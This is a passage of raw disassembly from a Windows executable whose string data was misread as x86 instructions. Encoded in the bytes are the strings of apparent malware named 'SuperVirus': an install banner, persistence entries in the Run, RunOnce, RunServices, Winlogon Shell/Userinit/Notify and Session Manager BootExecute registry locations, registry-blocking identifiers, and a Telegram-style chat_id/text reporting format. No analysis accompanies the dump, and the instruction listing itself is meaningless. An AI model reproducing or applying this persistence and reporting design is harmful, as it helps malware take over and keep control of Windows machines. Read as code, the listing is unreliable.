  4062b7:	6c                   	insb   (%dx),%es:(%edi)
  4062b8:	65 57                	gs push %edi
  4062ba:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  4062c1:	65 74 5f             	gs je  0x406323
  4062c4:	43                   	inc    %ebx
  4062c5:	72 65                	jb     0x40632c
  4062c7:	61                   	popa
  4062c8:	74 65                	je     0x40632f
  4062ca:	4e                   	dec    %esi
  4062cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4062cc:	57                   	push   %edi
  4062cd:	69 6e 64 6f 77 00 53 	imul   $0x5300776f,0x64(%esi),%ebp
  4062d4:	68 6f 77 57 69       	push   $0x6957776f
  4062d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4062da:	64 6f                	outsl  %fs:(%esi),(%dx)
  4062dc:	77 00                	ja     0x4062de
  4062de:	62 53 68             	bound  %edx,0x68(%ebx)
  4062e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4062e2:	77 00                	ja     0x4062e4
  4062e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4062e5:	43                   	inc    %ebx
  4062e6:	6d                   	insl   (%dx),%es:(%edi)
  4062e7:	64 53                	fs push %ebx
  4062e9:	68 6f 77 00 73       	push   $0x7300776f
  4062ee:	65 74 5f             	gs je  0x406350
  4062f1:	43                   	inc    %ebx
  4062f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4062f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4062f4:	74 72                	je     0x406368
  4062f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4062f7:	6c                   	insb   (%dx),%es:(%edi)
  4062f8:	42                   	inc    %edx
  4062f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4062fa:	78 00                	js     0x4062fc
  4062fc:	54                   	push   %esp
  4062fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4062fe:	41                   	inc    %ecx
  4062ff:	72 72                	jb     0x406373
  406301:	61                   	popa
  406302:	79 00                	jns    0x406304
  406304:	41                   	inc    %ecx
  406305:	64 64 54             	fs fs push %esp
  406308:	6f                   	outsl  %ds:(%esi),(%dx)
  406309:	47                   	inc    %edi
  40630a:	72 6f                	jb     0x40637b
  40630c:	75 70                	jne    0x40637e
  40630e:	50                   	push   %eax
  40630f:	6f                   	outsl  %ds:(%esi),(%dx)
  406310:	6c                   	insb   (%dx),%es:(%edi)
  406311:	69 63 79 00 43 72 65 	imul   $0x65724300,0x79(%ebx),%esp
  406318:	61                   	popa
  406319:	74 65                	je     0x406380
  40631b:	53                   	push   %ebx
  40631c:	75 62                	jne    0x406380
  40631e:	4b                   	dec    %ebx
  40631f:	65 79 00             	gs jns 0x406322
  406322:	4f                   	dec    %edi
  406323:	70 65                	jo     0x40638a
  406325:	6e                   	outsb  %ds:(%esi),(%dx)
  406326:	53                   	push   %ebx
  406327:	75 62                	jne    0x40638b
  406329:	4b                   	dec    %ebx
  40632a:	65 79 00             	gs jns 0x40632d
  40632d:	52                   	push   %edx
  40632e:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  406335:	4b 65 
  406337:	79 00                	jns    0x406339
  406339:	67 65 74 5f          	addr16 gs je 0x40639c
  40633d:	41                   	inc    %ecx
  40633e:	73 73                	jae    0x4063b3
  406340:	65 6d                	gs insl (%dx),%es:(%edi)
  406342:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  406346:	43                   	inc    %ebx
  406347:	6f                   	outsl  %ds:(%esi),(%dx)
  406348:	70 79                	jo     0x4063c3
  40634a:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
  40634e:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  406353:	79 00                	jns    0x406355
  406355:	42                   	inc    %edx
  406356:	6c                   	insb   (%dx),%es:(%edi)
  406357:	6f                   	outsl  %ds:(%esi),(%dx)
  406358:	63 6b 52             	arpl   %ebp,0x52(%ebx)
  40635b:	65 67 69 73 74 72 79 	imul   $0x73007972,%gs:0x74(%bp,%di),%esi
  406362:	00 73 
  406364:	65 74 5f             	gs je  0x4063c6
  406367:	4f                   	dec    %edi
  406368:	70 61                	jo     0x4063cb
  40636a:	63 69 74             	arpl   %ebp,0x74(%ecx)
  40636d:	79 00                	jns    0x40636f
  40636f:	00 00                	add    %al,(%eax)
  406371:	63 7b 00             	arpl   %edi,0x0(%ebx)
  406374:	7b 00                	jnp    0x406376
  406376:	20 00                	and    %al,(%eax)
  406378:	63 00                	arpl   %eax,(%eax)
  40637a:	68 00 61 00 74       	push   $0x74006100
  40637f:	00 5f 00             	add    %bl,0x0(%edi)
  406382:	69 00 64 00 20 00    	imul   $0x200064,(%eax),%eax
  406388:	3d 00 20 00 7b       	cmp    $0x7b002000,%eax
  40638d:	00 30                	add    %dh,(%eax)
  40638f:	00 7d 00             	add    %bh,0x0(%ebp)
  406392:	2c 00                	sub    $0x0,%al
  406394:	20 00                	and    %al,(%eax)
  406396:	74 00                	je     0x406398
  406398:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40639c:	74 00                	je     0x40639e
  40639e:	20 00                	and    %al,(%eax)
  4063a0:	3d 00 20 00 7b       	cmp    $0x7b002000,%eax
  4063a5:	00 31                	add    %dh,(%ecx)
  4063a7:	00 7d 00             	add    %bh,0x0(%ebp)
  4063aa:	2c 00                	sub    $0x0,%al
  4063ac:	20 00                	and    %al,(%eax)
  4063ae:	70 00                	jo     0x4063b0
  4063b0:	61                   	popa
  4063b1:	00 72 00             	add    %dh,0x0(%edx)
  4063b4:	73 00                	jae    0x4063b6
  4063b6:	65 00 5f 00          	add    %bl,%gs:0x0(%edi)
  4063ba:	6d                   	insl   (%dx),%es:(%edi)
  4063bb:	00 6f 00             	add    %ch,0x0(%edi)
  4063be:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4063c2:	20 00                	and    %al,(%eax)
  4063c4:	3d 00 20 00 7b       	cmp    $0x7b002000,%eax
  4063c9:	00 32                	add    %dh,(%edx)
  4063cb:	00 7d 00             	add    %bh,0x0(%ebp)
  4063ce:	20 00                	and    %al,(%eax)
  4063d0:	7d 00                	jge    0x4063d2
  4063d2:	7d 00                	jge    0x4063d4
  4063d4:	00 27                	add    %ah,(%edi)
  4063d6:	53                   	push   %ebx
  4063d7:	00 6f 00             	add    %ch,0x0(%edi)
  4063da:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  4063df:	00 61 00             	add    %ah,0x0(%ecx)
  4063e2:	72 00                	jb     0x4063e4
  4063e4:	65 00 5c 00 53       	add    %bl,%gs:0x53(%eax,%eax,1)
  4063e9:	00 75 00             	add    %dh,0x0(%ebp)
  4063ec:	70 00                	jo     0x4063ee
  4063ee:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4063f2:	56                   	push   %esi
  4063f3:	00 69 00             	add    %ch,0x0(%ecx)
  4063f6:	72 00                	jb     0x4063f8
  4063f8:	75 00                	jne    0x4063fa
  4063fa:	73 00                	jae    0x4063fc
  4063fc:	00 13                	add    %dl,(%ebx)
  4063fe:	49                   	dec    %ecx
  4063ff:	00 6e 00             	add    %ch,0x0(%esi)
  406402:	73 00                	jae    0x406404
  406404:	74 00                	je     0x406406
  406406:	61                   	popa
  406407:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40640b:	00 65 00             	add    %ah,0x0(%ebp)
  40640e:	64 00 00             	add    %al,%fs:(%eax)
  406411:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  406415:	00 75 00             	add    %dh,0x0(%ebp)
  406418:	65 00 00             	add    %al,%gs:(%eax)
  40641b:	4f                   	dec    %edi
  40641c:	05 27 20 00 53       	add    $0x53002027,%eax
  406421:	00 55 00             	add    %dl,0x0(%ebp)
  406424:	50                   	push   %eax
  406425:	00 45 00             	add    %al,0x0(%ebp)
  406428:	52                   	push   %edx
  406429:	00 20                	add    %ah,(%eax)
  40642b:	00 56 00             	add    %dl,0x0(%esi)
  40642e:	49                   	dec    %ecx
  40642f:	00 52 00             	add    %dl,0x0(%edx)
  406432:	55                   	push   %ebp
  406433:	00 53 00             	add    %dl,0x0(%ebx)
  406436:	20 00                	and    %al,(%eax)
  406438:	49                   	dec    %ecx
  406439:	00 4e 00             	add    %cl,0x0(%esi)
  40643c:	53                   	push   %ebx
  40643d:	00 54 00 41          	add    %dl,0x41(%eax,%eax,1)
  406441:	00 4c 00 4c          	add    %cl,0x4c(%eax,%eax,1)
  406445:	00 45 00             	add    %al,0x0(%ebp)
  406448:	44                   	inc    %esp
  406449:	00 0a                	add    %cl,(%edx)
  40644b:	00 3d d8 04 dd 20    	add    %bh,0x20dd04d8
  406451:	00 52 00             	add    %dl,0x0(%edx)
  406454:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  406458:	6f                   	outsl  %ds:(%esi),(%dx)
  406459:	00 6f 00             	add    %ch,0x0(%edi)
  40645c:	74 00                	je     0x40645e
  40645e:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  406464:	2e 00 2e             	add    %ch,%cs:(%esi)
  406467:	00 2e                	add    %ch,(%esi)
  406469:	00 01                	add    %al,(%ecx)
  40646b:	5b                   	pop    %ebx
  40646c:	53                   	push   %ebx
  40646d:	00 4f 00             	add    %cl,0x0(%edi)
  406470:	46                   	inc    %esi
  406471:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  406475:	00 41 00             	add    %al,0x0(%ecx)
  406478:	52                   	push   %edx
  406479:	00 45 00             	add    %al,0x0(%ebp)
  40647c:	5c                   	pop    %esp
  40647d:	00 4d 00             	add    %cl,0x0(%ebp)
  406480:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  406486:	6f                   	outsl  %ds:(%esi),(%dx)
  406487:	00 73 00             	add    %dh,0x0(%ebx)
  40648a:	6f                   	outsl  %ds:(%esi),(%dx)
  40648b:	00 66 00             	add    %ah,0x0(%esi)
  40648e:	74 00                	je     0x406490
  406490:	5c                   	pop    %esp
  406491:	00 57 00             	add    %dl,0x0(%edi)
  406494:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40649a:	6f                   	outsl  %ds:(%esi),(%dx)
  40649b:	00 77 00             	add    %dh,0x0(%edi)
  40649e:	73 00                	jae    0x4064a0
  4064a0:	5c                   	pop    %esp
  4064a1:	00 43 00             	add    %al,0x0(%ebx)
  4064a4:	75 00                	jne    0x4064a6
  4064a6:	72 00                	jb     0x4064a8
  4064a8:	72 00                	jb     0x4064aa
  4064aa:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4064ae:	74 00                	je     0x4064b0
  4064b0:	56                   	push   %esi
  4064b1:	00 65 00             	add    %ah,0x0(%ebp)
  4064b4:	72 00                	jb     0x4064b6
  4064b6:	73 00                	jae    0x4064b8
  4064b8:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4064be:	5c                   	pop    %esp
  4064bf:	00 52 00             	add    %dl,0x0(%edx)
  4064c2:	75 00                	jne    0x4064c4
  4064c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4064c5:	00 00                	add    %al,(%eax)
  4064c7:	15 53 00 75 00       	adc    $0x750053,%eax
  4064cc:	70 00                	jo     0x4064ce
  4064ce:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4064d2:	56                   	push   %esi
  4064d3:	00 69 00             	add    %ch,0x0(%ecx)
  4064d6:	72 00                	jb     0x4064d8
  4064d8:	75 00                	jne    0x4064da
  4064da:	73 00                	jae    0x4064dc
  4064dc:	00 63 53             	add    %ah,0x53(%ebx)
  4064df:	00 4f 00             	add    %cl,0x0(%edi)
  4064e2:	46                   	inc    %esi
  4064e3:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  4064e7:	00 41 00             	add    %al,0x0(%ecx)
  4064ea:	52                   	push   %edx
  4064eb:	00 45 00             	add    %al,0x0(%ebp)
  4064ee:	5c                   	pop    %esp
  4064ef:	00 4d 00             	add    %cl,0x0(%ebp)
  4064f2:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  4064f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4064f9:	00 73 00             	add    %dh,0x0(%ebx)
  4064fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4064fd:	00 66 00             	add    %ah,0x0(%esi)
  406500:	74 00                	je     0x406502
  406502:	5c                   	pop    %esp
  406503:	00 57 00             	add    %dl,0x0(%edi)
  406506:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40650c:	6f                   	outsl  %ds:(%esi),(%dx)
  40650d:	00 77 00             	add    %dh,0x0(%edi)
  406510:	73 00                	jae    0x406512
  406512:	5c                   	pop    %esp
  406513:	00 43 00             	add    %al,0x0(%ebx)
  406516:	75 00                	jne    0x406518
  406518:	72 00                	jb     0x40651a
  40651a:	72 00                	jb     0x40651c
  40651c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406520:	74 00                	je     0x406522
  406522:	56                   	push   %esi
  406523:	00 65 00             	add    %ah,0x0(%ebp)
  406526:	72 00                	jb     0x406528
  406528:	73 00                	jae    0x40652a
  40652a:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  406530:	5c                   	pop    %esp
  406531:	00 52 00             	add    %dl,0x0(%edx)
  406534:	75 00                	jne    0x406536
  406536:	6e                   	outsb  %ds:(%esi),(%dx)
  406537:	00 4f 00             	add    %cl,0x0(%edi)
  40653a:	6e                   	outsb  %ds:(%esi),(%dx)
  40653b:	00 63 00             	add    %ah,0x0(%ebx)
  40653e:	65 00 00             	add    %al,%gs:(%eax)
  406541:	6b 53 00 4f          	imul   $0x4f,0x0(%ebx),%edx
  406545:	00 46 00             	add    %al,0x0(%esi)
  406548:	54                   	push   %esp
  406549:	00 57 00             	add    %dl,0x0(%edi)
  40654c:	41                   	inc    %ecx
  40654d:	00 52 00             	add    %dl,0x0(%edx)
  406550:	45                   	inc    %ebp
  406551:	00 5c 00 4d          	add    %bl,0x4d(%eax,%eax,1)
  406555:	00 69 00             	add    %ch,0x0(%ecx)
  406558:	63 00                	arpl   %eax,(%eax)
  40655a:	72 00                	jb     0x40655c
  40655c:	6f                   	outsl  %ds:(%esi),(%dx)
  40655d:	00 73 00             	add    %dh,0x0(%ebx)
  406560:	6f                   	outsl  %ds:(%esi),(%dx)
  406561:	00 66 00             	add    %ah,0x0(%esi)
  406564:	74 00                	je     0x406566
  406566:	5c                   	pop    %esp
  406567:	00 57 00             	add    %dl,0x0(%edi)
  40656a:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  406570:	6f                   	outsl  %ds:(%esi),(%dx)
  406571:	00 77 00             	add    %dh,0x0(%edi)
  406574:	73 00                	jae    0x406576
  406576:	5c                   	pop    %esp
  406577:	00 43 00             	add    %al,0x0(%ebx)
  40657a:	75 00                	jne    0x40657c
  40657c:	72 00                	jb     0x40657e
  40657e:	72 00                	jb     0x406580
  406580:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406584:	74 00                	je     0x406586
  406586:	56                   	push   %esi
  406587:	00 65 00             	add    %ah,0x0(%ebp)
  40658a:	72 00                	jb     0x40658c
  40658c:	73 00                	jae    0x40658e
  40658e:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  406594:	5c                   	pop    %esp
  406595:	00 52 00             	add    %dl,0x0(%edx)
  406598:	75 00                	jne    0x40659a
  40659a:	6e                   	outsb  %ds:(%esi),(%dx)
  40659b:	00 53 00             	add    %dl,0x0(%ebx)
  40659e:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4065a2:	76 00                	jbe    0x4065a4
  4065a4:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  4065aa:	73 00                	jae    0x4065ac
  4065ac:	00 6b 53             	add    %ch,0x53(%ebx)
  4065af:	00 4f 00             	add    %cl,0x0(%edi)
  4065b2:	46                   	inc    %esi
  4065b3:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  4065b7:	00 41 00             	add    %al,0x0(%ecx)
  4065ba:	52                   	push   %edx
  4065bb:	00 45 00             	add    %al,0x0(%ebp)
  4065be:	5c                   	pop    %esp
  4065bf:	00 4d 00             	add    %cl,0x0(%ebp)
  4065c2:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  4065c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4065c9:	00 73 00             	add    %dh,0x0(%ebx)
  4065cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4065cd:	00 66 00             	add    %ah,0x0(%esi)
  4065d0:	74 00                	je     0x4065d2
  4065d2:	5c                   	pop    %esp
  4065d3:	00 57 00             	add    %dl,0x0(%edi)
  4065d6:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4065dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4065dd:	00 77 00             	add    %dh,0x0(%edi)
  4065e0:	73 00                	jae    0x4065e2
  4065e2:	20 00                	and    %al,(%eax)
  4065e4:	4e                   	dec    %esi
  4065e5:	00 54 00 5c          	add    %dl,0x5c(%eax,%eax,1)
  4065e9:	00 43 00             	add    %al,0x0(%ebx)
  4065ec:	75 00                	jne    0x4065ee
  4065ee:	72 00                	jb     0x4065f0
  4065f0:	72 00                	jb     0x4065f2
  4065f2:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4065f6:	74 00                	je     0x4065f8
  4065f8:	56                   	push   %esi
  4065f9:	00 65 00             	add    %ah,0x0(%ebp)
  4065fc:	72 00                	jb     0x4065fe
  4065fe:	73 00                	jae    0x406600
  406600:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  406606:	5c                   	pop    %esp
  406607:	00 57 00             	add    %dl,0x0(%edi)
  40660a:	69 00 6e 00 6c 00    	imul   $0x6c006e,(%eax),%eax
  406610:	6f                   	outsl  %ds:(%esi),(%dx)
  406611:	00 67 00             	add    %ah,0x0(%edi)
  406614:	6f                   	outsl  %ds:(%esi),(%dx)
  406615:	00 6e 00             	add    %ch,0x0(%esi)
  406618:	00 0b                	add    %cl,(%ebx)
  40661a:	53                   	push   %ebx
  40661b:	00 68 00             	add    %ch,0x0(%eax)
  40661e:	65 00 6c 00 6c       	add    %ch,%gs:0x6c(%eax,%eax,1)
  406623:	00 00                	add    %al,(%eax)
  406625:	19 65 00             	sbb    %esp,0x0(%ebp)
  406628:	78 00                	js     0x40662a
  40662a:	70 00                	jo     0x40662c
  40662c:	6c                   	insb   (%dx),%es:(%edi)
  40662d:	00 6f 00             	add    %ch,0x0(%edi)
  406630:	72 00                	jb     0x406632
  406632:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406636:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40663a:	78 00                	js     0x40663c
  40663c:	65 00 00             	add    %al,%gs:(%eax)
  40663f:	03 2c 00             	add    (%eax,%eax,1),%ebp
  406642:	00 11                	add    %dl,(%ecx)
  406644:	55                   	push   %ebp
  406645:	00 73 00             	add    %dh,0x0(%ebx)
  406648:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40664c:	69 00 6e 00 69 00    	imul   $0x69006e,(%eax),%eax
  406652:	74 00                	je     0x406654
  406654:	00 01                	add    %al,(%ecx)
  406656:	00 79 53             	add    %bh,0x53(%ecx)
  406659:	00 4f 00             	add    %cl,0x0(%edi)
  40665c:	46                   	inc    %esi
  40665d:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  406661:	00 41 00             	add    %al,0x0(%ecx)
  406664:	52                   	push   %edx
  406665:	00 45 00             	add    %al,0x0(%ebp)
  406668:	5c                   	pop    %esp
  406669:	00 4d 00             	add    %cl,0x0(%ebp)
  40666c:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  406672:	6f                   	outsl  %ds:(%esi),(%dx)
  406673:	00 73 00             	add    %dh,0x0(%ebx)
  406676:	6f                   	outsl  %ds:(%esi),(%dx)
  406677:	00 66 00             	add    %ah,0x0(%esi)
  40667a:	74 00                	je     0x40667c
  40667c:	5c                   	pop    %esp
  40667d:	00 57 00             	add    %dl,0x0(%edi)
  406680:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  406686:	6f                   	outsl  %ds:(%esi),(%dx)
  406687:	00 77 00             	add    %dh,0x0(%edi)
  40668a:	73 00                	jae    0x40668c
  40668c:	20 00                	and    %al,(%eax)
  40668e:	4e                   	dec    %esi
  40668f:	00 54 00 5c          	add    %dl,0x5c(%eax,%eax,1)
  406693:	00 43 00             	add    %al,0x0(%ebx)
  406696:	75 00                	jne    0x406698
  406698:	72 00                	jb     0x40669a
  40669a:	72 00                	jb     0x40669c
  40669c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4066a0:	74 00                	je     0x4066a2
  4066a2:	56                   	push   %esi
  4066a3:	00 65 00             	add    %ah,0x0(%ebp)
  4066a6:	72 00                	jb     0x4066a8
  4066a8:	73 00                	jae    0x4066aa
  4066aa:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4066b0:	5c                   	pop    %esp
  4066b1:	00 57 00             	add    %dl,0x0(%edi)
  4066b4:	69 00 6e 00 6c 00    	imul   $0x6c006e,(%eax),%eax
  4066ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4066bb:	00 67 00             	add    %ah,0x0(%edi)
  4066be:	6f                   	outsl  %ds:(%esi),(%dx)
  4066bf:	00 6e 00             	add    %ch,0x0(%esi)
  4066c2:	5c                   	pop    %esp
  4066c3:	00 4e 00             	add    %cl,0x0(%esi)
  4066c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4066c7:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4066cb:	00 66 00             	add    %ah,0x0(%esi)
  4066ce:	79 00                	jns    0x4066d0
  4066d0:	00 80 8f 53 00 4f    	add    %al,0x4f00538f(%eax)
  4066d6:	00 46 00             	add    %al,0x0(%esi)
  4066d9:	54                   	push   %esp
  4066da:	00 57 00             	add    %dl,0x0(%edi)
  4066dd:	41                   	inc    %ecx
  4066de:	00 52 00             	add    %dl,0x0(%edx)
  4066e1:	45                   	inc    %ebp
  4066e2:	00 5c 00 4d          	add    %bl,0x4d(%eax,%eax,1)
  4066e6:	00 69 00             	add    %ch,0x0(%ecx)
  4066e9:	63 00                	arpl   %eax,(%eax)
  4066eb:	72 00                	jb     0x4066ed
  4066ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4066ee:	00 73 00             	add    %dh,0x0(%ebx)
  4066f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4066f2:	00 66 00             	add    %ah,0x0(%esi)
  4066f5:	74 00                	je     0x4066f7
  4066f7:	5c                   	pop    %esp
  4066f8:	00 57 00             	add    %dl,0x0(%edi)
  4066fb:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  406701:	6f                   	outsl  %ds:(%esi),(%dx)
  406702:	00 77 00             	add    %dh,0x0(%edi)
  406705:	73 00                	jae    0x406707
  406707:	20 00                	and    %al,(%eax)
  406709:	4e                   	dec    %esi
  40670a:	00 54 00 5c          	add    %dl,0x5c(%eax,%eax,1)
  40670e:	00 43 00             	add    %al,0x0(%ebx)
  406711:	75 00                	jne    0x406713
  406713:	72 00                	jb     0x406715
  406715:	72 00                	jb     0x406717
  406717:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40671b:	74 00                	je     0x40671d
  40671d:	56                   	push   %esi
  40671e:	00 65 00             	add    %ah,0x0(%ebp)
  406721:	72 00                	jb     0x406723
  406723:	73 00                	jae    0x406725
  406725:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40672b:	5c                   	pop    %esp
  40672c:	00 57 00             	add    %dl,0x0(%edi)
  40672f:	69 00 6e 00 6c 00    	imul   $0x6c006e,(%eax),%eax
  406735:	6f                   	outsl  %ds:(%esi),(%dx)
  406736:	00 67 00             	add    %ah,0x0(%edi)
  406739:	6f                   	outsl  %ds:(%esi),(%dx)
  40673a:	00 6e 00             	add    %ch,0x0(%esi)
  40673d:	5c                   	pop    %esp
  40673e:	00 4e 00             	add    %cl,0x0(%esi)
  406741:	6f                   	outsl  %ds:(%esi),(%dx)
  406742:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  406746:	00 66 00             	add    %ah,0x0(%esi)
  406749:	79 00                	jns    0x40674b
  40674b:	5c                   	pop    %esp
  40674c:	00 53 00             	add    %dl,0x0(%ebx)
  40674f:	75 00                	jne    0x406751
  406751:	70 00                	jo     0x406753
  406753:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406757:	56                   	push   %esi
  406758:	00 69 00             	add    %ch,0x0(%ecx)
  40675b:	72 00                	jb     0x40675d
  40675d:	75 00                	jne    0x40675f
  40675f:	73 00                	jae    0x406761
  406761:	00 0f                	add    %cl,(%edi)
  406763:	44                   	inc    %esp
  406764:	00 4c 00 4c          	add    %cl,0x4c(%eax,%eax,1)
  406768:	00 4e 00             	add    %cl,0x0(%esi)
  40676b:	61                   	popa
  40676c:	00 6d 00             	add    %ch,0x0(%ebp)
  40676f:	65 00 00             	add    %al,%gs:(%eax)
  406772:	0f 53 00             	rcpps  (%eax),%xmm0
  406775:	74 00                	je     0x406777
  406777:	61                   	popa
  406778:	00 72 00             	add    %dh,0x0(%edx)
  40677b:	74 00                	je     0x40677d
  40677d:	75 00                	jne    0x40677f
  40677f:	70 00                	jo     0x406781
  406781:	00 0b                	add    %cl,(%ebx)
  406783:	4c                   	dec    %esp
  406784:	00 6f 00             	add    %ch,0x0(%edi)
  406787:	67 00 6f 00          	add    %ch,0x0(%bx)
  40678b:	6e                   	outsb  %ds:(%esi),(%dx)
  40678c:	00 00                	add    %al,(%eax)
  40678e:	61                   	popa
  40678f:	53                   	push   %ebx
  406790:	00 59 00             	add    %bl,0x0(%ecx)
  406793:	53                   	push   %ebx
  406794:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  406798:	00 4d 00             	add    %cl,0x0(%ebp)
  40679b:	5c                   	pop    %esp
  40679c:	00 43 00             	add    %al,0x0(%ebx)
  40679f:	75 00                	jne    0x4067a1
  4067a1:	72 00                	jb     0x4067a3
  4067a3:	72 00                	jb     0x4067a5
  4067a5:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4067a9:	74 00                	je     0x4067ab
  4067ab:	43                   	inc    %ebx
  4067ac:	00 6f 00             	add    %ch,0x0(%edi)
  4067af:	6e                   	outsb  %ds:(%esi),(%dx)
  4067b0:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  4067b4:	00 6f 00             	add    %ch,0x0(%edi)
  4067b7:	6c                   	insb   (%dx),%es:(%edi)
  4067b8:	00 53 00             	add    %dl,0x0(%ebx)
  4067bb:	65 00 74 00 5c       	add    %dh,%gs:0x5c(%eax,%eax,1)
  4067c0:	00 43 00             	add    %al,0x0(%ebx)
  4067c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4067c4:	00 6e 00             	add    %ch,0x0(%esi)
  4067c7:	74 00                	je     0x4067c9
  4067c9:	72 00                	jb     0x4067cb
  4067cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4067cc:	00 6c 00 5c          	add    %ch,0x5c(%eax,%eax,1)
  4067d0:	00 53 00             	add    %dl,0x0(%ebx)
  4067d3:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4067d7:	73 00                	jae    0x4067d9
  4067d9:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4067df:	20 00                	and    %al,(%eax)
  4067e1:	4d                   	dec    %ebp
  4067e2:	00 61 00             	add    %ah,0x0(%ecx)
  4067e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4067e6:	00 61 00             	add    %ah,0x0(%ecx)
  4067e9:	67 00 65 00          	add    %ah,0x0(%di)
  4067ed:	72 00                	jb     0x4067ef
  4067ef:	00 0b                	add    %cl,(%ebx)
  4067f1:	53                   	push   %ebx
  4067f2:	00 65 00             	add    %ah,0x0(%ebp)
  4067f5:	74 00                	je     0x4067f7
  4067f7:	75 00                	jne    0x4067f9
  4067f9:	70 00                	jo     0x4067fb
  4067fb:	00 03                	add    %al,(%ebx)
  4067fd:	3b 00                	cmp    (%eax),%eax
  4067ff:	00 17                	add    %dl,(%edi)
  406801:	42                   	inc    %edx
  406802:	00 6f 00             	add    %ch,0x0(%edi)
  406805:	6f                   	outsl  %ds:(%esi),(%dx)
  406806:	00 74 00 45          	add    %dh,0x45(%eax,%eax,1)
  40680a:	00 78 00             	add    %bh,0x0(%eax)
  40680d:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  406811:	75 00                	jne    0x406813
  406813:	74 00                	je     0x406815
  406815:	65 00 00             	add    %al,%gs:(%eax)
  406818:	03 0a                	add    (%edx),%ecx
  40681a:	00 00                	add    %al,(%eax)
  40681c:	7f 53                	jg     0x406871
  40681e:	00 4f 00             	add    %cl,0x0(%edi)
  406821:	46                   	inc    %esi
  406822:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  406826:	00 41 00             	add    %al,0x0(%ecx)
  406829:	52                   	push   %edx
  40682a:	00 45 00             	add    %al,0x0(%ebp)
  40682d:	5c                   	pop    %esp
  40682e:	00 4d 00             	add    %cl,0x0(%ebp)
  406831:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  406837:	6f                   	outsl  %ds:(%esi),(%dx)
  406838:	00 73 00             	add    %dh,0x0(%ebx)
  40683b:	6f                   	outsl  %ds:(%esi),(%dx)
  40683c:	00 66 00             	add    %ah,0x0(%esi)
  40683f:	74 00                	je     0x406841
  406841:	5c                   	pop    %esp
  406842:	00 57 00             	add    %dl,0x0(%edi)
